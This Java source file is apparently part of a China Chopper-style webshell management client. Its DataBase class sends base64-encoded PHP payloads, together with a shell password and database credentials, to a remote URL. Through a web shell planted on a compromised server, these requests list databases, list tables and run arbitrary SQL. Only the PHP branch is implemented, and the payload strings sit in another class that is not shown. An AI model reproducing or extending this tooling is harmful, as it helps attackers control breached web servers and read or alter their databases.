package com.ms509.util;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

import javax.swing.JTree;

import sun.misc.BASE64Encoder;

public class DataBase {

	private static String dbtype;
	private static String dbhost;
	private static String dbuser;
	private static String dbpass;
	private static String dbcode;

	public DataBase() {
		// TODO Auto-generated constructor stub
	}
	//初始化配置文件
	private static void init(String config)
	{
		 dbtype = config.substring(config.indexOf("<T>")+3, config.indexOf("</T>"));
		 dbhost = config.substring(config.indexOf("<H>")+3, config.indexOf("</H>"));
		 dbuser = config.substring(config.indexOf("<U>")+3, config.indexOf("</U>"));
		 dbpass = config.substring(config.indexOf("<P>")+3, config.indexOf("</P>"));
		 dbcode = config.substring(config.indexOf("<L>")+3, config.indexOf("</L>"));
	}
	
	//获取数据库库名
	public static String[] getDBs(String url, String pass, String config, int type,String code) {
		//System.out.print("config="+config);
//		String dbtype = config.substring(config.indexOf("<T>")+3, config.indexOf("</T>"));
//		String dbhost = config.substring(config.indexOf("<H>")+3, config.indexOf("</H>"));
//		String dbuser = config.substring(config.indexOf("<U>")+3, config.indexOf("</U>"));
//		String dbpass = config.substring(config.indexOf("<P>")+3, config.indexOf("</P>"));
//		String dbcode = config.substring(config.indexOf("<L>")+3, config.indexOf("</L>"));
		init(config);
		String[] result = null;
		String rs = null;
		switch (type) {
		case 0:
			System.out.println("jsp");
			break; // jsp
		case 1:
			System.out.println("php");
			if(Safe.PHP_BASE64.equals("1"))
			{
				System.out.println("use base 64");
				String payload = "";
				try {
					BASE64Encoder encode = new BASE64Encoder();
					
					payload = encode.encode(Safe.PHP_DB_MYSQL.getBytes(code));
					payload = URLEncoder.encode(payload);
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				String sp = "choraheiheihei";
				String p1 = dbhost+sp+dbuser+sp+dbpass;				
				String params = pass+"="+Safe.PHP_MAKE+"&"+Safe.ACTION+"=" + payload +"&z1="+p1+"&z2=&z3=";
				//System.out.println(params);
				rs = Common.send(url, params, code);
				//System.out.println(rs);
			}
			break; // php
		case 2:
			System.out.println("asp");
			break; // asp
		case 3:
			System.out.println("aspx");
			break; // aspx
		}
		result = rs.split("\t\\|\t\r\n");
		return result;
	}
	
	
	//获取数据库表明
	public static String getTables(String url, String pass, String config, int type,String code,String dbn)
	{
		//String result = null;
		String s = "show tables from "+dbn;
		String result = exec_sql(url,pass,config,type,code,s,dbn);
		return result;
	}
	
	
	//执行sql语句
	public static String exec_sql(String url, String pass, String config, int type,String code,String sql,String dbn) {
		//System.out.print("config="+config);
		init(config);
		String dbsql = "";
		String result = "";
		switch (type) {
		case 0:
			System.out.println("jsp");
			break; // jsp
		case 1:   //还需区分数据库类型
			System.out.println("php");
			if(Safe.PHP_BASE64.equals("1"))
			{
				System.out.println("use base 64");
				String payload = "";
				try {
					BASE64Encoder encode = new BASE64Encoder();
					
					payload = encode.encode(Safe.PHP_DB_MYSQL.getBytes(code));
					payload = URLEncoder.encode(payload);
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				try {
					BASE64Encoder encode = new BASE64Encoder();
					
					dbsql = encode.encode(sql.getBytes(code));
					dbsql = URLEncoder.encode(dbsql);
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				String sp = "choraheiheihei";
				String p1 = dbhost+sp+dbuser+sp+dbpass;				
				String params = pass+"="+Safe.PHP_MAKE+"&"+Safe.ACTION+"=" + payload +"&z1="+p1+"&z2="+dbn+"&z3="+dbsql;
				//System.out.println(params);
				result = Common.send(url, params, code);
				//System.out.println(rs);
			}
			break; // php
		case 2:
			System.out.println("asp");
			break; // asp
		case 3:
			System.out.println("aspx");
			break; // aspx
		}
		return result;
	}


}
